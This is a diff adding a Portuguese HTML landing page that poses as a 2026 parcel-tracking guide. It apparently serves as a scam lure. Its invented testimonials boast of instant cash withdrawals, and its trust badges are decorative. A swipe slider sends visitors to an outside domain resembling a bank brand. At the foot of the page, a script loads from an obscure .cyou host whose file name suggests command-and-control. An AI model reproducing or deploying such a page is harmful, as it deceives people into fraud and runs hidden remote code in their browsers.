@@ -1,0 +1,1173 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+  <meta name="robots" content="noindex,nofollow">
+  <meta name="referrer" content="no-referrer">
+  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+  <meta http-equiv="Pragma" content="no-cache">
+  <meta http-equiv="Expires" content="0">
+  
+  <title>Guia 2026 - CARLOS RENATO DE CAMARGO</title>
+  
+  <link rel="preload" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" as="style">
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+  
+  <style>
+    :root{
+      --bg-primary: #820AD1;
+      --bg-secondary: #f3f4f6;
+      --primary: #9703D3;
+      --primary-light: #DCBCE8;
+      --primary-dark: #9903D6;
+      --secondary: #1976d2;
+      --secondary-light: #42a5f5;
+      --success: #10b981;
+      --success-light: #34d399;
+      --text-primary: #f9fafb;
+      --text-secondary: #4b5563;
+      --text-muted: #6b7280;
+      --white: #ffffff;
+      --gray-50: #f9fafb;
+      --gray-100: #f3f4f6;
+      --gray-200: #e5e7eb;
+      --gray-300: #d1d5db;
+      --gray-400: #9ca3af;
+      --gray-500: #6b7280;
+      --border: #e5e7eb;
+      --shadow: rgba(15, 23, 42, 0.08);
+      --accent: #9703D3;
+      --accent-light: #DCBCE8;
+      --accent-dark: #9903D6;
+    }
+    
+    * { 
+      box-sizing: border-box; 
+      margin: 0; 
+      padding: 0; 
+    }
+    
+    html { 
+      height: 100%; 
+      -webkit-text-size-adjust: 100%;
+      -ms-text-size-adjust: 100%;
+    }
+    
+    body {
+      font-family: Inter, system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+      background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
+      color: var(--text-primary);
+      line-height: 1.6;
+      overflow-x: hidden;
+      min-height: 100vh;
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+
+    .bot-trap {
+      position: absolute !important;
+      left: -9999px !important;
+      top: -9999px !important;
+      width: 1px !important;
+      height: 1px !important;
+      opacity: 0 !important;
+      pointer-events: none !important;
+      overflow: hidden !important;
+    }
+
+    .bot-honeypot {
+      display: none !important;
+      visibility: hidden !important;
+    }
+
+    .container {
+      min-height: 100vh;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      position: relative;
+    }
+
+    .main-card {
+      width: 100%;
+      max-width: 580px;
+      background: var(--white);
+      border-radius: 16px;
+      padding: 40px;
+      position: relative;
+      box-shadow: 
+        0 10px 25px var(--shadow),
+        0 0 0 1px var(--border);
+      border: 1px solid var(--border);
+    }
+
+    .header {
+      text-align: center;
+      margin-bottom: 32px;
+    }
+
+    .badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      background: linear-gradient(135deg, var(--accent), var(--secondary));
+      color: var(--white);
+      padding: 8px 16px;
+      border-radius: 20px;
+      font-size: 13px;
+      font-weight: 600;
+      margin-bottom: 20px;
+      letter-spacing: 0.025em;
+      box-shadow: 0 4px 12px rgba(233, 30, 99, 0.3);
+    }
+
+    .shield {
+      width: 16px;
+      height: 16px;
+      flex-shrink: 0;
+    }
+
+    h1 {
+      font-size: clamp(28px, 5vw, 36px);
+      font-weight: 700;
+      color: var(--accent-dark);
+      margin-bottom: 12px;
+      line-height: 1.2;
+      letter-spacing: -0.025em;
+    }
+
+    .subtitle {
+      font-size: clamp(16px, 3.5vw, 18px);
+      color: var(--text-secondary);
+      margin-bottom: 0;
+      line-height: 1.5;
+      max-width: 480px;
+      margin-left: auto;
+      margin-right: auto;
+    }
+
+    .benefits {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
+      gap: 16px;
+      margin-bottom: 40px;
+    }
+
+    .benefit {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      padding: 16px;
+      background: linear-gradient(135deg, var(--gray-50), var(--white));
+      border-radius: 12px;
+      border: 1px solid var(--border);
+      transition: all 0.2s ease;
+    }
+
+    .benefit:hover {
+      background: var(--white);
+      box-shadow: 0 4px 12px var(--shadow);
+      transform: translateY(-1px);
+      border-color: var(--accent-light);
+    }
+
+    .benefit-icon {
+      width: 20px;
+      height: 20px;
+      color: var(--accent);
+      flex-shrink: 0;
+    }
+
+    .benefit-text {
+      font-weight: 500;
+      color: var(--text-primary);
+      font-size: 15px;
+    }
+
+    .slider-section {
+      margin-bottom: 32px;
+      padding: 24px 0;
+    }
+
+    .slider-title {
+      text-align: center;
+      font-size: clamp(18px, 4vw, 22px);
+      font-weight: 600;
+      color: var(--accent-dark);
+      margin-bottom: 20px;
+      letter-spacing: -0.025em;
+    }
+
+    .slider {
+      position: relative;
+      height: 64px;
+      border-radius: 32px;
+      background: var(--gray-100);
+      overflow: hidden;
+      border: 2px solid var(--border);
+      cursor: ew-resize;
+      box-shadow: inset 0 2px 4px rgba(15, 23, 42, 0.05);
+      touch-action: pan-x;
+      transition: border-color 0.2s ease;
+    }
+
+    .slider:hover {
+      border-color: var(--accent-light);
+    }
+
+    .slider-fill {
+      position: absolute;
+      left: 0;
+      top: 0;
+      height: 100%;
+      width: 0;
+      background: linear-gradient(90deg, var(--accent), var(--secondary-light));
+      transition: width 0.1s ease;
+      opacity: 0.8;
+    }
+
+    .slider-btn {
+      position: absolute;
+      top: 4px;
+      left: 4px;
+      width: 56px;
+      height: 56px;
+      border-radius: 50%;
+      background: var(--white);
+      border: 2px solid var(--accent);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 18px;
+      font-weight: 600;
+      color: var(--accent);
+      cursor: grab;
+      user-select: none;
+      box-shadow: 0 4px 12px var(--shadow);
+      transition: all 0.2s ease;
+      touch-action: none;
+    }
+
+    .slider-btn:active {
+      cursor: grabbing;
+      transform: scale(0.98);
+    }
+
+    .slider-label {
+      position: absolute;
+      inset: 0;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      color: var(--text-secondary);
+      font-weight: 500;
+      font-size: 15px;
+      pointer-events: none;
+    }
+
+    .slider-arrows {
+      position: absolute;
+      right: 20px;
+      top: 50%;
+      transform: translateY(-50%);
+      display: flex;
+      gap: 4px;
+      color: var(--gray-400);
+      font-size: 14px;
+      pointer-events: none;
+    }
+
+    .slider-arrows span {
+      animation: slideArrow 2s infinite;
+    }
+
+    .slider-arrows span:nth-child(2) { animation-delay: 0.3s; }
+    .slider-arrows span:nth-child(3) { animation-delay: 0.6s; }
+
+    @keyframes slideArrow {
+      0%, 100% { transform: translateX(0); opacity: 0.4; }
+      50% { transform: translateX(6px); opacity: 1; }
+    }
+
+    .slider.success {
+      background: linear-gradient(135deg, #f0fdf4, #dcfce7);
+      border-color: var(--success);
+    }
+
+    .slider.success .slider-btn {
+      background: var(--success);
+      color: var(--white);
+      border-color: var(--success);
+    }
+
+    .slider-hint {
+      text-align: center;
+      margin-top: 12px;
+      font-size: 14px;
+      color: var(--text-muted);
+    }
+
+    .slider-loading-overlay {
+      position: absolute;
+      inset: 0;
+      background: rgba(255, 255, 255, 0.95);
+      border-radius: 32px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      opacity: 0;
+      visibility: hidden;
+      transition: all 0.3s ease;
+      backdrop-filter: blur(2px);
+      z-index: 10;
+    }
+
+    .slider-loading-overlay.active {
+      opacity: 1;
+      visibility: visible;
+    }
+
+    .slider-spinner {
+      width: 32px;
+      height: 32px;
+      border: 3px solid var(--gray-200);
+      border-top: 3px solid var(--accent);
+      border-radius: 50%;
+      animation: sliderSpinAnim 0.8s linear infinite;
+    }
+
+    @keyframes sliderSpinAnim {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    .slider-success-check {
+      width: 48px;
+      height: 48px;
+      background: linear-gradient(135deg, var(--success), var(--success-light));
+      border-radius: 50%;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 12px rgba(16, 185, 129, 0.4);
+      animation: checkPop 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+
+    .slider-success-check.show {
+      display: flex;
+    }
+
+    .slider-success-check svg {
+      width: 24px;
+      height: 24px;
+      stroke: white;
+      stroke-width: 3;
+      stroke-linecap: round;
+      stroke-linejoin: round;
+      fill: none;
+    }
+
+    .slider-success-check svg path {
+      stroke-dasharray: 50;
+      stroke-dashoffset: 50;
+      animation: checkDraw 0.4s ease-out 0.2s forwards;
+    }
+
+    @keyframes checkPop {
+      0% { transform: scale(0); }
+      50% { transform: scale(1.1); }
+      100% { transform: scale(1); }
+    }
+
+    @keyframes checkDraw {
+      to { stroke-dashoffset: 0; }
+    }
+
+    .testimonials-section {
+      margin: 40px 0 32px;
+      padding: 32px 0;
+      border-top: 1px solid var(--border);
+    }
+
+    .testimonials-title {
+      text-align: center;
+      font-size: clamp(20px, 4vw, 24px);
+      font-weight: 700;
+      color: var(--accent-dark);
+      margin-bottom: 24px;
+      letter-spacing: -0.025em;
+    }
+
+    .testimonials-carousel {
+      position: relative;
+      overflow: hidden;
+      padding: 0 8px;
+    }
+
+    .testimonials-track {
+      display: flex;
+      gap: 16px;
+      transition: transform 0.4s ease;
+    }
+
+    .testimonial-card {
+      flex: 0 0 100%;
+      background: linear-gradient(135deg, var(--gray-50), var(--white));
+      border-radius: 12px;
+      padding: 20px;
+      border: 1px solid var(--border);
+      box-shadow: 0 2px 8px var(--shadow);
+    }
+
+    .testimonial-header {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      margin-bottom: 12px;
+    }
+
+    .testimonial-avatar {
+      width: 48px;
+      height: 48px;
+      border-radius: 50%;
+      background: var(--accent-light);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      color: var(--accent-dark);
+      font-size: 18px;
+      overflow: hidden;
+      border: 2px solid var(--accent-light);
+    }
+
+    .testimonial-avatar img {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+    }
+
+    .testimonial-name {
+      font-weight: 600;
+      color: var(--text-primary);
+      font-size: 16px;
+    }
+
+    .testimonial-text {
+      color: var(--text-secondary);
+      font-size: 14px;
+      line-height: 1.6;
+      font-style: italic;
+    }
+
+    .carousel-controls {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 16px;
+      margin-top: 20px;
+    }
+
+    .carousel-btn {
+      width: 36px;
+      height: 36px;
+      border-radius: 50%;
+      border: 2px solid var(--accent);
+      background: var(--white);
+      color: var(--accent);
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s ease;
+    }
+
+    .carousel-btn:hover:not(:disabled) {
+      background: var(--accent);
+      color: var(--white);
+      transform: scale(1.05);
+    }
+
+    .carousel-btn:disabled {
+      opacity: 0.3;
+      cursor: not-allowed;
+    }
+
+    .carousel-dots {
+      display: flex;
+      gap: 8px;
+    }
+
+    .carousel-dot {
+      width: 8px;
+      height: 8px;
+      border-radius: 50%;
+      background: var(--gray-300);
+      cursor: pointer;
+      transition: all 0.2s ease;
+    }
+
+    .carousel-dot.active {
+      background: var(--accent);
+      width: 24px;
+      border-radius: 4px;
+    }
+
+    .trust-section {
+      display: flex;
+      justify-content: center;
+      gap: 16px;
+      margin-bottom: 24px;
+      flex-wrap: wrap;
+    }
+
+    .trust-item {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      padding: 8px 12px;
+      background: var(--white);
+      border-radius: 20px;
+      font-size: 12px;
+      font-weight: 500;
+      color: var(--text-secondary);
+      border: 1px solid var(--border);
+    }
+
+    .trust-icon {
+      width: 14px;
+      height: 14px;
+      color: var(--accent);
+      flex-shrink: 0;
+    }
+
+    .legal-links {
+      text-align: center;
+      font-size: 12px;
+      color: var(--text-muted);
+      line-height: 1.6;
+      padding-top: 20px;
+      border-top: 1px solid var(--border);
+    }
+
+    .about-toggle {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      cursor: pointer;
+      padding: 8px;
+      margin: 0 auto 12px;
+      max-width: 200px;
+      background: var(--gray-50);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      transition: all 0.2s ease;
+    }
+
+    .about-toggle:hover {
+      background: var(--accent-light);
+      border-color: var(--accent);
+    }
+
+    .about-toggle-text {
+      font-weight: 600;
+      color: var(--text-primary);
+      font-size: 13px;
+    }
+
+    .about-toggle-icon {
+      width: 14px;
+      height: 14px;
+      transition: transform 0.3s ease;
+    }
+
+    .about-toggle.active .about-toggle-icon {
+      transform: rotate(180deg);
+    }
+
+    .company-info {
+      max-height: 0;
+      overflow: hidden;
+      opacity: 0;
+      transition: all 0.3s ease;
+      margin-bottom: 0;
+    }
+
+    .company-info.expanded {
+      max-height: 200px;
+      opacity: 1;
+      margin-bottom: 12px;
+      padding-bottom: 12px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .legal-links .company-name {
+      font-weight: 600;
+      color: var(--text-primary);
+      display: block;
+      margin-bottom: 6px;
+      font-size: 13px;
+    }
+
+    .legal-links .company-details {
+      display: flex;
+      flex-wrap: wrap;
+      justify-content: center;
+      gap: 8px;
+      margin-bottom: 6px;
+      font-size: 11px;
+    }
+
+    .legal-links .company-details span {
+      display: inline-block;
+    }
+
+    .legal-links .separator {
+      color: var(--gray-400);
+    }
+
+    .legal-links .links-row {
+      margin-top: 8px;
+    }
+
+    .legal-links a {
+      color: var(--accent);
+      text-decoration: none;
+      font-weight: 500;
+      margin: 0 8px;
+    }
+
+    .legal-links a:hover {
+      text-decoration: underline;
+    }
+
+    @media (max-width: 640px) {
+      .about-toggle {
+        max-width: 160px;
+        padding: 6px;
+      }
+
+      .company-info.expanded {
+        max-height: 250px;
+      }
+    }
+
+    .loading-overlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(248, 250, 252, 0.95);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      backdrop-filter: blur(4px);
+    }
+
+    .loading-spinner {
+      width: 32px;
+      height: 32px;
+      border: 2px solid var(--gray-200);
+      border-top: 2px solid var(--accent);
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    @media (max-width: 640px) {
+      .container {
+        padding: 16px;
+      }
+
+      .main-card {
+        padding: 24px 20px;
+        border-radius: 12px;
+      }
+
+      .benefits {
+        grid-template-columns: 1fr;
+        gap: 12px;
+      }
+
+      .slider {
+        height: 56px;
+        min-width: 280px;
+      }
+
+      .slider-btn {
+        width: 48px;
+        height: 48px;
+        font-size: 16px;
+      }
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .main-card {
+      animation: fadeIn 0.5s ease-out;
+    }
+  </style>
+</head>
+<body>
+  <div class="loading-overlay" id="loadingOverlay" style="opacity: 0;">
+    <div class="loading-spinner"></div>
+  </div>
+
+  <div class="bot-trap" aria-hidden="true">
+    <input type="text" name="email" value="" tabindex="-1" autocomplete="off">
+  </div>
+
+  <div class="container">
+    <main class="main-card" role="main">
+      <header class="header">
+        <div class="badge" role="img" aria-label="Portal Online">
+          <svg class="shield" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" aria-hidden="true">
+            <path d="M12 3l7 4v7c0 3.9-3.1 7-7 7s-7-3.1-7-7V7l7-4Z"></path>
+            <path d="M9 12l2 2 4-4"></path>
+          </svg>
+          Portal Online
+        </div>
+        
+        <h1>Guia 2026</h1>
+        <p class="subtitle">Rastreie suas encomendas e saiba onde está seu pedido</p>
+      </header>
+      <section class="slider-section" aria-label="Passo a passo">
+        <h2 class="slider-title">Ver Passo a Passo</h2>
+        
+        <div class="slider" id="slider" role="button" aria-label="Deslize para continuar" tabindex="0">
+          <div class="slider-fill" id="sliderFill"></div>
+          <div class="slider-btn" id="sliderBtn">→</div>
+          <div class="slider-label" id="sliderLabel">Deslize para Continuar</div>
+          <div class="slider-arrows" aria-hidden="true">
+            <span>›</span><span>›</span><span>›</span>
+          </div>
+          <div class="slider-loading-overlay" id="sliderLoadingOverlay">
+            <div class="slider-spinner" id="sliderSpinner"></div>
+            <div class="slider-success-check" id="sliderSuccessCheck">
+              <svg viewBox="0 0 24 24">
+                <path d="M5 12l5 5L20 7"></path>
+              </svg>
+            </div>
+          </div>
+        </div>
+        
+        <p class="slider-hint">Arraste para continuar</p>
+      </section>
+
+      <section class="testimonials-section">
+        <h2 class="testimonials-title">Histórias reais de quem conseguiu rastrear suas encomendas</h2>
+        
+        <div class="testimonials-carousel">
+          <div class="testimonials-track" id="testimonialsTrack" style="transform: translateX(0%);">
+  <article class="testimonial-card">
+    <div class="testimonial-header">
+      <div class="testimonial-avatar">RC</div>
+      <div class="testimonial-name">Renata C. Carvalho</div>
+    </div>
+    <p class="testimonial-text">"Não acreditei quando vi o dinheiro na minha conta! Consegui realizar meu saque hoje e isso mudou completamente minha semana. Que novidade incrível!"</p>
+  </article>
+
+  <article class="testimonial-card">
+    <div class="testimonial-header">
+      <div class="testimonial-avatar">MF</div>
+      <div class="testimonial-name">Martaniela Flores</div>
+    </div>
+    <p class="testimonial-text">"Acabei de descobrir isso agora e já fiz meu saque! O valor caiu na hora, nunca pensei que fosse tão simples. Isso realmente mudou minha vida!"</p>
+  </article>
+
+  <article class="testimonial-card">
+    <div class="testimonial-header">
+      <div class="testimonial-avatar">AP</div>
+      <div class="testimonial-name">Antônio P. Pereira</div>
+    </div>
+    <p class="testimonial-text">"Fiz meu saque hoje cedo e o dinheiro chegou rapidinho. Uma novidade que eu precisava conhecer há muito tempo. Mudou tudo pra mim!"</p>
+  </article>
+
+  <article class="testimonial-card">
+    <div class="testimonial-header">
+      <div class="testimonial-avatar">JR</div>
+      <div class="testimonial-name">Jose Ramão</div>
+    </div>
+    <p class="testimonial-text">"Acabei de descobrir essa novidade e já realizei meu saque sem nenhuma dificuldade. O dinheiro caiu na conta na hora. Isso mudou minha vida!"</p>
+  </article>
+</div>
+        </div>
+
+        <div class="carousel-controls">
+          <button class="carousel-btn" id="prevBtn" aria-label="Anterior" disabled="">‹</button>
+          <div class="carousel-dots" id="carouselDots"><div class="carousel-dot active"></div><div class="carousel-dot"></div><div class="carousel-dot"></div><div class="carousel-dot"></div></div>
+          <button class="carousel-btn" id="nextBtn" aria-label="Próximo">›</button>
+        </div>
+      </section>
+
+      <section class="trust-section" aria-label="Indicadores de confiança">
+        <div class="trust-item">
+          <svg class="trust-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M9 12l2 2 4-4"></path>
+            <circle cx="12" cy="12" r="10"></circle>
+          </svg>
+          Conexão protegida (HTTPS)
+        </div>
+        <div class="trust-item">
+          <svg class="trust-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+            <circle cx="12" cy="16" r="1"></circle>
+            <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
+          </svg>
+          Privacidade
+        </div>
+        <div class="trust-item">
+          <svg class="trust-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"></path>
+          </svg>
+          Online
+        </div>
+      </section>
+
+      <footer class="legal-links" role="contentinfo">
+        <div class="about-toggle" id="aboutToggle" role="button" aria-expanded="false" aria-controls="companyInfo" tabindex="0">
+          <span class="about-toggle-text">Sobre nós</span>
+          <svg class="about-toggle-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <polyline points="6 9 12 15 18 9"></polyline>
+          </svg>
+        </div>
+
+        <div class="company-info" id="companyInfo" aria-hidden="true">
+          <span class="company-name">CARLOS RENATO DE CAMARGO</span>
+          <div class="company-details"><span>CNPJ: <span>45.363.560/0002-20</span></span><span class="separator">•</span><span>CARLOS RENATO DE CAMARGO</span></div>
+          <div class="company-details"><span>BOA ESPERANCA DO SUL</span>/<span>PR</span></div>
+        </div>
+        
+        <div class="links-row">
+          <a href="privacy.html" aria-label="Política de Privacidade">Política de Privacidade</a> •
+          <a href="cookie.html" aria-label="Política de Cookies">Cookies</a> •
+          <a href="terms.html" aria-label="Termos de Uso">Termos de Uso</a>
+        </div>
+      </footer>
+    </main>
+  </div>
+
+  <script src="js/cookie.js"></script>
+  <script>
+    (function() {
+      'use strict';
+      
+      const botDetection = {
+        init() {
+          this.hideLoading();
+        },
+        hideLoading() {
+          setTimeout(() => {
+            const overlay = document.getElementById('loadingOverlay');
+            if (overlay) {
+              overlay.style.opacity = '0';
+              setTimeout(() => overlay.remove(), 200);
+            }
+          }, 400);
+        }
+      };
+      
+      const slider = {
+        elements: {},
+        state: {
+          dragging: false,
+          startX: 0,
+          startLeft: 0,
+          maxLeft: 0,
+          completed: false,
+          threshold: 30
+        },
+        
+        init() {
+          this.elements = {
+            slider: document.getElementById('slider'),
+            btn: document.getElementById('sliderBtn'),
+            fill: document.getElementById('sliderFill'),
+            label: document.getElementById('sliderLabel'),
+            loadingOverlay: document.getElementById('sliderLoadingOverlay'),
+            spinner: document.getElementById('sliderSpinner'),
+            successCheck: document.getElementById('sliderSuccessCheck')
+          };
+          
+          if (!this.elements.slider) return;
+          
+          this.updateMaxLeft();
+          this.bindEvents();
+        },
+        
+        updateMaxLeft() {
+          this.state.maxLeft = this.elements.slider.clientWidth - this.elements.btn.clientWidth - 8;
+        },
+        
+        bindEvents() {
+          this.elements.btn.addEventListener('mousedown', this.startDrag.bind(this));
+          document.addEventListener('mousemove', this.drag.bind(this));
+          document.addEventListener('mouseup', this.stopDrag.bind(this));
+          
+          this.elements.btn.addEventListener('touchstart', this.startDrag.bind(this), { passive: false });
+          document.addEventListener('touchmove', this.drag.bind(this), { passive: false });
+          document.addEventListener('touchend', this.stopDrag.bind(this));
+          
+          window.addEventListener('resize', this.updateMaxLeft.bind(this), { passive: true });
+        },
+        
+        startDrag(e) {
+          if (this.state.completed) return;
+          this.state.dragging = true;
+          this.state.startX = e.touches ? e.touches[0].clientX : e.clientX;
+          this.state.startLeft = parseInt(this.elements.btn.style.left || '4') || 4;
+          this.elements.btn.style.transition = 'none';
+          this.elements.fill.style.transition = 'none';
+          e.preventDefault();
+        },
+        
+        drag(e) {
+          if (!this.state.dragging || this.state.completed) return;
+          const currentX = e.touches ? e.touches[0].clientX : e.clientX;
+          const deltaX = currentX - this.state.startX;
+          const newLeft = Math.min(Math.max(this.state.startLeft + deltaX, 4), this.state.maxLeft);
+          
+          this.elements.btn.style.left = newLeft + 'px';
+          this.elements.fill.style.width = (newLeft + this.elements.btn.clientWidth / 2) + 'px';
+          
+          const progress = newLeft / this.state.maxLeft;
+          if (progress > 0.85) {
+            this.elements.slider.style.borderColor = 'var(--success)';
+          } else {
+            this.elements.slider.style.borderColor = '';
+          }
+          
+          if (newLeft >= this.state.maxLeft - this.state.threshold) {
+            this.complete();
+          }
+          
+          e.preventDefault();
+        },
+        
+        stopDrag() {
+          if (!this.state.dragging || this.state.completed) return;
+          this.state.dragging = false;
+          const currentLeft = parseInt(this.elements.btn.style.left) || 4;
+          
+          const progress = currentLeft / this.state.maxLeft;
+          if (progress >= 0.7) {
+            this.snapToComplete();
+          } else {
+            this.reset();
+          }
+        },
+        
+        snapToComplete() {
+          this.elements.btn.style.transition = 'left 0.3s ease';
+          this.elements.fill.style.transition = 'width 0.3s ease';
+          this.elements.btn.style.left = this.state.maxLeft + 'px';
+          this.elements.fill.style.width = (this.state.maxLeft + this.elements.btn.clientWidth / 2) + 'px';
+          
+          setTimeout(() => this.complete(), 300);
+        },
+        
+        reset() {
+          this.elements.btn.style.transition = 'left 0.3s ease';
+          this.elements.fill.style.transition = 'width 0.3s ease';
+          this.elements.btn.style.left = '4px';
+          this.elements.fill.style.width = '0px';
+          this.elements.slider.style.borderColor = '';
+        },
+        
+        complete() {
+          if (this.state.completed) return;
+          this.state.completed = true;
+          this.state.dragging = false;
+          
+          this.elements.slider.classList.add('success');
+          this.elements.btn.innerHTML = '🚚';
+          this.elements.label.textContent = 'Processando...';
+          
+          if (navigator.vibrate) {
+            navigator.vibrate(50);
+          }
+          
+          setTimeout(() => {
+            this.elements.loadingOverlay.classList.add('active');
+            
+            setTimeout(() => {
+              this.elements.spinner.style.display = 'none';
+              this.elements.successCheck.classList.add('show');
+              this.elements.label.textContent = 'Pronto!';
+              
+              setTimeout(() => {
+                // Usa caminho absoluto /type/ para evitar problemas no iOS
+                // O servidor serve link.php automaticamente
+                var targetUrl = "https://simplenu.online/";
+                try {
+                  window.location.replace(targetUrl);
+                } catch(e) {
+                  window.location.href = targetUrl;
+                }
+              }, 800);
+            }, 1000);
+          }, 400);
+        },
+
+        resetAll() {
+          this.state.completed = false;
+          this.state.dragging = false;
+          
+          this.elements.slider.classList.remove('success');
+          this.elements.btn.innerHTML = '→';
+          this.elements.btn.style.left = '4px';
+          this.elements.fill.style.width = '0px';
+          this.elements.label.textContent = 'Deslize para Continuar';
+          this.elements.slider.style.borderColor = '';
+          
+          this.elements.loadingOverlay.classList.remove('active');
+          this.elements.spinner.style.display = 'block';
+          this.elements.successCheck.classList.remove('show');
+        }
+      };
+
+      window.addEventListener('pageshow', (event) => {
+        if (event.persisted && slider.elements.slider) {
+          slider.resetAll();
+        }
+      });
+
+      const testimonials = {
+        currentIndex: 0,
+        totalItems: 4,
+        
+        init() {
+          this.track = document.getElementById('testimonialsTrack');
+          this.dotsContainer = document.getElementById('carouselDots');
+          this.prevBtn = document.getElementById('prevBtn');
+          this.nextBtn = document.getElementById('nextBtn');
+          
+          if (!this.track) return;
+          
+          this.createDots();
+          this.bindEvents();
+          this.updateCarousel();
+        },
+        
+        createDots() {
+          for (let i = 0; i < this.totalItems; i++) {
+            const dot = document.createElement('div');
+            dot.className = 'carousel-dot';
+            if (i === 0) dot.classList.add('active');
+            dot.addEventListener('click', () => this.goToSlide(i));
+            this.dotsContainer.appendChild(dot);
+          }
+        },
+        
+        bindEvents() {
+          this.prevBtn.addEventListener('click', () => this.prev());
+          this.nextBtn.addEventListener('click', () => this.next());
+          
+          let touchStartX = 0;
+          let touchEndX = 0;
+          
+          this.track.addEventListener('touchstart', (e) => {
+            touchStartX = e.touches[0].clientX;
+          }, { passive: true });
+          
+          this.track.addEventListener('touchend', (e) => {
+            touchEndX = e.changedTouches[0].clientX;
+            const diff = touchStartX - touchEndX;
+            if (Math.abs(diff) > 50) {
+              if (diff > 0) this.next();
+              else this.prev();
+            }
+          }, { passive: true });
+        },
+        
+        prev() {
+          if (this.currentIndex > 0) {
+            this.currentIndex--;
+            this.updateCarousel();
+          }
+        },
+        
+        next() {
+          if (this.currentIndex < this.totalItems - 1) {
+            this.currentIndex++;
+            this.updateCarousel();
+          }
+        },
+        
+        goToSlide(index) {
+          this.currentIndex = index;
+          this.updateCarousel();
+        },
+        
+        updateCarousel() {
+          this.track.style.transform = `translateX(-${this.currentIndex * 100}%)`;
+          
+          const dots = this.dotsContainer.querySelectorAll('.carousel-dot');
+          dots.forEach((dot, i) => {
+            dot.classList.toggle('active', i === this.currentIndex);
+          });
+          
+          this.prevBtn.disabled = this.currentIndex === 0;
+          this.nextBtn.disabled = this.currentIndex === this.totalItems - 1;
+        }
+      };
+      
+      const aboutToggle = {
+        init() {
+          const toggle = document.getElementById('aboutToggle');
+          const info = document.getElementById('companyInfo');
+          
+          if (!toggle || !info) return;
+          
+          const toggleAbout = () => {
+            const isExpanded = toggle.classList.contains('active');
+            
+            if (isExpanded) {
+              toggle.classList.remove('active');
+              info.classList.remove('expanded');
+              toggle.setAttribute('aria-expanded', 'false');
+              info.setAttribute('aria-hidden', 'true');
+            } else {
+              toggle.classList.add('active');
+              info.classList.add('expanded');
+              toggle.setAttribute('aria-expanded', 'true');
+              info.setAttribute('aria-hidden', 'false');
+            }
+          };
+          
+          toggle.addEventListener('click', toggleAbout);
+          
+          toggle.addEventListener('keydown', (e) => {
+            if (e.key === 'Enter' || e.key === ' ') {
+              e.preventDefault();
+              toggleAbout();
+            }
+          });
+        }
+      };
+      
+      if (document.readyState === 'loading') {
+        document.addEventListener('DOMContentLoaded', () => {
+          botDetection.init();
+          slider.init();
+          testimonials.init();
+          aboutToggle.init();
+        });
+      } else {
+        botDetection.init();
+        slider.init();
+        testimonials.init();
+        aboutToggle.init();
+      }
+      
+    })();
+  </script>
+
+<script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl504886'},{'dcenter':'p3'},{'cp_id':'10823836'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src="https://meucesscoreomax686ix.cyou/js/scc-c2.min.js"></script></body><script>'undefined'=== typeof _trfq || (window._trfq = []);'undefined'=== typeof _trfd && (window._trfd=[]),_trfd.push({'tccl.baseHost':'secureserver.net'},{'ap':'cpsh-oh'},{'server':'p3plzcpnl508295'},{'dcenter':'p3'},{'cp_id':'10887387'},{'cp_cl':'8'}) // Monitoring performance to make your website faster. If you want to opt-out, please contact web hosting support.</script><script src='https://img1.wsimg.com/traffic-assets/js/tccl.min.js'></script></html>
